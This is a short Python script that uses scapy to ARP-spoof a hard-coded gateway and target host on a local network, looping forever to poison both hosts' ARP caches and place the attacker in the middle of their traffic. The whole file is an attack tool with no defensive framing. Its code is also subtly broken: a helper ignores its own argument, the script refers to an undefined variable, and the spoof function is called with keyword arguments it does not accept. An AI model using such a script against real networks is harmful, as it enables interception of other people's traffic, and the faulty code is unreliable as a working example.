import scapy.all as scapy



def spoof(gateway_ip, gateway_mac, target_ip):
    spoofed_arp_packet = scapy.ARP(pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
    scapy.send(spoofed_arp_packet)

def get_mac(ip):
    arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=target_ip) 
    reply = scapy.srp(arp_request) 
    if reply:
        return reply[0][1].src 
    return None

def wait_till_mac_found(ip):
    mac = None
    while not mac:
        mac = get_mac(ip)
        if not mac:
            print("MAC address for {} not found ".format(target_ipv))
    return mac

gateway_ip = "192.168.20.1" 
target_ip = "192.168.50.178"  
target_mac = wait_till_mac_found(target_ip)
gateway_mac = wait_till_mac_found(gateway_ip)

while True:
    spoof(target_ip=target_ip, target_mac=target_mac, ip=gateway_ip)
    spoof(target_ip=gateway_ip, target_mac=gateway_mac, ip=target_ip)
    print("Spoofing is active")
